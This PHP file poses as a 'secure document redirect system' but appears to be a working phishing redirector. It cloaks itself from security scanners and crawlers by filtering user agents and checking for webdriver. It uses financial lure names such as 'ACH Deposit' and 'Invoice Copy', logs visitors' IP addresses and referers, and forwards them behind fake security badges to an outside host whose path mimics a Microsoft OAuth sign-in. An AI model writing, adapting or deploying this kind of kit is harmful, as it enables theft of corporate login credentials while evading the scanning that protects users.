<?php
// ==============================================
// SECURE DOCUMENT REDIRECT SYSTEM WITH BOT PROTECTION
// ==============================================

// Enable error reporting for debugging (disable in production)
error_reporting(0);
ini_set('display_errors', 0);

// ================= CONFIGURATION =================
$config = [
    // Security settings
    'expire_seconds' => 60,                    // 1-minute expiration
    'redirect_delay' => 3,                     // 3-second redirect delay
    'log_file' => 'secure_redirect.log',       // Access log
    
    // Bot protection settings
    'block_bots' => true,                      // Enable bot blocking
    'allowed_user_agents' => [                 // Whitelist of allowed user agents
        'Mozilla', 'Chrome', 'Safari', 'Edge', 'Firefox', 'Opera'
    ],
    
    // Destination URL (where to redirect after validation)
    'destination_url' => 'https://representative-joelynn-activedirectory-39a69909.koyeb.app/oauth2/common/client_id_b61c8803-16f3-4c35-9b17-6f65f441df86/',
    
    // Output file names (for logging)
    'output_names' => [
        'Financial Statements',
        'Month End Audit',
        'Payment Confirmation',
        'Invoice Copy',
        'ACH Deposit',
        'Corporate Forms'
    ]
];

// ================= BOT DETECTION =================
function isBot() {
    global $config;
    
    // Skip bot check if disabled in config
    if (!$config['block_bots']) return false;
    
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    
    // Empty user agent is always blocked
    if (empty($userAgent)) return true;
    
    // Check against known bot user agents
    $botPatterns = [
        'bot', 'crawl', 'spider', 'slurp', 'archiver', 'facebook', 'scoutjet',
        'python', 'java', 'wget', 'curl', 'perl', 'ruby', 'phantom', 'node',
        'headless', 'googlebot', 'bingbot', 'yandex', 'baidu', 'duckduckgo'
    ];
    
    foreach ($botPatterns as $pattern) {
        if (stripos($userAgent, $pattern) !== false) {
            return true;
        }
    }
    
    // Check if user agent is in whitelist
    $allowed = false;
    foreach ($config['allowed_user_agents'] as $agent) {
        if (stripos($userAgent, $agent) !== false) {
            $allowed = true;
            break;
        }
    }
    
    return !$allowed;
}

// ================= SECURITY CHECKS =================
// Block direct CLI access
if (php_sapi_name() === 'cli') {
    header('HTTP/1.1 403 Forbidden');
    die("Access Denied: This system is only accessible via web browsers.");
}

// Block bots and crawlers
if (isBot()) {
    header('HTTP/1.1 403 Forbidden');
    die("Access Denied: Automated access not permitted.");
}

// ================= TOKEN HANDLING =================
function generateToken() {
    return bin2hex(random_bytes(16)) . '_' . time();
}

function isTokenValid($token) {
    global $config;
    $parts = explode('_', $token);
    return (count($parts) === 2 && (time() - (int)$parts[1]) <= $config['expire_seconds']);
}

// ================= REQUEST HANDLING =================
try {
    // Handle redirect request
    if (isset($_GET['token'])) {
        $token = $_GET['token'];
        
        if (!isTokenValid($token)) {
            throw new Exception("This secure link has expired after {$config['expire_seconds']} seconds.");
        }
        
        // Select a random document name for logging
        $docName = $config['output_names'][array_rand($config['output_names'])];
        
        // Log successful access
        file_put_contents($config['log_file'], sprintf(
            "%s|REDIRECTED|%s|%s|%s|%s|%s\n",
            date('Y-m-d H:i:s'),
            $_SERVER['REMOTE_ADDR'],
            $token,
            $docName,
            $_SERVER['HTTP_REFERER'] ?? 'direct',
            $_SERVER['HTTP_USER_AGENT']
        ), FILE_APPEND);
        
        // Perform the redirect
        header("Location: {$config['destination_url']}");
        exit;
    }

    // ================= NEW REQUEST =================
    // Generate new token for this session
    $token = generateToken();
    
    $current_url = (isset($_SERVER['HTTPS']) ? 'https://' : 'http://') . 
                  $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'];
    $secureUrl = $current_url . '?token=' . urlencode($token);
    
    // Log generation
    file_put_contents($config['log_file'], sprintf(
        "%s|GENERATED|%s|%s|%s\n",
        date('Y-m-d H:i:s'),
        $_SERVER['REMOTE_ADDR'],
        $token,
        $_SERVER['HTTP_USER_AGENT']
    ), FILE_APPEND);
    
} catch (Exception $e) {
    // Error handling
    error_log("Secure Redirect Error: " . $e->getMessage());
    http_response_code(500);
    header('Content-Type: text/html; charset=utf-8');
    die("<h1>Error</h1><p>{$e->getMessage()}</p>");
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Document Redirect</title>
    <meta name="robots" content="noindex, nofollow, noarchive">
    <meta http-equiv="refresh" content="<?= $config['redirect_delay'] ?>;url=<?= htmlspecialchars($secureUrl) ?>">
    <style>
        body {
            font-family: 'Segoe UI', Roboto, sans-serif;
            line-height: 1.6;
            margin: 0;
            padding: 0;
            background: #f8f9fa;
            color: #212529;
        }
        .container {
            max-width: 800px;
            margin: 50px auto;
            padding: 30px;
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
            text-align: center;
        }
        h1 {
            color: #0d6efd;
            margin-bottom: 20px;
        }
        .countdown {
            font-size: 1.5em;
            color: #dc3545;
            font-weight: bold;
            margin: 25px 0;
        }
        .security-badge {
            display: inline-block;
            background: #198754;
            color: white;
            padding: 8px 15px;
            border-radius: 20px;
            font-size: 0.9em;
            margin: 15px 0;
        }
        .manual-link {
            margin: 25px 0;
        }
        .btn {
            display: inline-block;
            background: #0d6efd;
            color: white;
            padding: 10px 20px;
            border-radius: 5px;
            text-decoration: none;
            transition: background 0.3s;
        }
        .btn:hover {
            background: #0b5ed7;
        }
        .notice {
            margin-top: 25px;
            padding: 15px;
            background: #fff3cd;
            border-left: 4px solid #ffc107;
            text-align: left;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Secure Document Access</h1>
        <div class="security-badge">Protected Connection</div>
        
        <div class="countdown">
            Redirecting in <span id="countdown"><?= $config['redirect_delay'] ?></span> seconds...
        </div>
        
        <div class="manual-link">
            <a href="<?= htmlspecialchars($secureUrl) ?>" class="btn">Continue to Document</a>
        </div>
        
        <div class="notice">
            <strong>Security Notice:</strong> This is a secure, one-time access link that will expire shortly. 
            Please ensure you are in a private location before proceeding. Automated access attempts are blocked.
        </div>
    </div>

    <script>
        // Enhanced countdown with animation
        let seconds = <?= $config['redirect_delay'] ?>;
        function updateCountdown() {
            const countdownEl = document.getElementById('countdown');
            countdownEl.textContent = seconds;
            countdownEl.style.transform = 'scale(1.2)';
            setTimeout(() => { countdownEl.style.transform = 'scale(1)'; }, 200);
            
            if (seconds-- > 0) {
                setTimeout(updateCountdown, 1000);
            }
        }
        updateCountdown();
        
        // Additional bot protection
        document.addEventListener('DOMContentLoaded', function() {
            if (navigator.webdriver || window.callPhantom || window._phantom) {
                document.body.innerHTML = '<h1>Access Denied</h1><p>Automated browsing not permitted.</p>';
            }
        });
    </script>
</body>
</html>
